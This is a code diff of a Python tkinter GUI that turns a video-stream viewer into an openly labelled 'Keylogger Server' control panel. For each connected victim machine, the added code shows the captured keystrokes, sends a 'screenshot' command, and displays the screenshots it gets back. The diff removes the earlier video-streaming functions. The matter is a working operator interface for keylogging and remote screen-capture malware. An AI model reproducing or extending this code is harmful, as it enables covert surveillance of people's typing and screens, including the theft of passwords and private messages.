@@ -1,12 +1,16 @@
 import tkinter as tk
 from tkinter import ttk
 import threading
-import server
+import server_copy as server
 import cv2
 from PIL import Image, ImageTk
 import numpy as np
+import os
+import time
+import queue
 
 selected_client = None
+
 
 # Function to start the server.
 def start_server():
@@ -14,55 +18,37 @@ def start_server():
     server_thread = threading.Thread(target=server.start_server, args=(update_clients_list,))
     server_thread.start()
 
-# Function to start streaming for the selected client.
-def start_stream(client_address, canvas):
-    def display_video():
-        client_socket = server.client_sockets.get(client_address)
-        if client_socket:
-            while True:
-                try:
-                    frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
-                    frame_data = b''
-                    while len(frame_data) < frame_size:
-                        packet = client_socket.recv(min(server.BUFFER_SIZE, frame_size - len(frame_data)))
-                        if not packet:
-                            break
-                        frame_data += packet
-                    if not frame_data:
-                        break
-                    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
-                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-                    img = Image.fromarray(frame)
-                    imgtk = ImageTk.PhotoImage(image=img)
-                    canvas.create_image(0, 0, anchor=tk.NW, image=imgtk)
-                    canvas.image = imgtk
-                except Exception as e:
-                    print(f"Error: {e}")
-                    break
-            client_socket.close()
-
-    threading.Thread(target=display_video).start()
-
-# Function to end the stream.
-def end_stream():
-    server.stop_server()
-    root.quit()
 
 # Function to close the server.
 def close_server():
     server.stop_server()
 
-# Function to update the list of connected clients.
+
+# Function to send commands to a selected client.
+def send_command(command, client):
+    if client:
+        client_socket = server.client_sockets.get(client)
+        if client_socket:
+            client_socket.sendall(command.encode())
+        else:
+            print(f"No socket found for client: {client}")
+    else:
+        print("No client selected")
+
+
+# Function to update the list of connected clients in the GUI.
 def update_clients_list(clients):
     for widget in clients_frame.winfo_children():
         widget.destroy()
     for client in clients:
         client_frame = tk.Frame(clients_frame, bg="#333333")
         client_label = tk.Label(client_frame, text=f"{client[0]}:{client[1]}", bg="#333333", fg="#ffffff", font=('Helvetica', 12))
-        connect_button = ttk.Button(client_frame, text="Connect", command=lambda c=client: open_client_window(c))
+
+        connect_button = ttk.Button(client_frame, text="See Keypress", command=lambda c=client: open_client_window(c))
         client_label.pack(side=tk.LEFT, padx=5)
         connect_button.pack(side=tk.RIGHT, padx=5)
         client_frame.pack(fill=tk.X, pady=5)
+
 
 # Function to open a new window for the selected client.
 def open_client_window(client):
@@ -71,18 +57,58 @@ def open_client_window(client):
     client_window.geometry("640x480")
     client_window.configure(bg="#222222")
 
-    start_button = ttk.Button(client_window, text="Start Stream", command=lambda: start_stream(client, canvas))
-    start_button.pack(pady=10)
-
-    end_button = ttk.Button(client_window, text="End Stream", command=client_window.destroy)
+    end_button = ttk.Button(client_window, text="Back", command=client_window.destroy)
     end_button.pack(pady=10)
 
-    canvas = tk.Canvas(client_window, width=640, height=480, bg="#222222")
-    canvas.pack(pady=10)
+    screenshot_button = ttk.Button(client_window, text="Take Screenshot", command=lambda: send_command("screenshot", client))
+    screenshot_button.pack(pady=10)
+
+    text_widget = tk.Text(client_window, width=80, height=20, bg="#222222", fg="#ffffff", font=('Helvetica', 12))
+    text_widget.pack(pady=10)
+
+    def update_keypresses():
+        last_keypress_time = time.time()
+        while True:
+            try:
+                keypress = server.keypress_queues[client].get(timeout=5)
+                text_widget.insert(tk.END, keypress)
+                text_widget.see(tk.END)
+                last_keypress_time = time.time()
+            except queue.Empty:
+                if time.time() - last_keypress_time >= 5 and text_widget.get("end-2c") != '\n':
+                    text_widget.insert(tk.END, '\n')
+                    text_widget.see(tk.END)
+                    last_keypress_time = time.time()
+
+    threading.Thread(target=update_keypresses, daemon=True).start()
+
+    # Button to show the screenshot in a new window
+    show_image_button = ttk.Button(client_window, text="Show Screenshot", command=lambda: display_screenshot(client))
+    show_image_button.pack(pady=10)
+
+
+# Function to display the screenshot in a new window
+def display_screenshot(client):
+    # Check if the screenshot file exists
+    image_filename = f"{client[0]}_screenshot.jpg"
+    if os.path.exists(image_filename):
+        image_window = tk.Toplevel(root)
+        image_window.title(f"Screenshot from {client[0]}")
+
+        # Load and display the image using PIL
+        image = Image.open(image_filename)
+        image = ImageTk.PhotoImage(image)
+        image_label = tk.Label(image_window, image=image)
+        image_label.image = image  # Keep a reference to prevent garbage collection
+        image_label.pack()
+
+    else:
+        print(f"No screenshot found for {client[0]}")
+
 
 # Create the GUI.
 root = tk.Tk()
-root.title("Video Stream Server")
+root.title("Keylogger Server")
 root.geometry("400x400")  # Set the window size
 
 # Apply dark theme
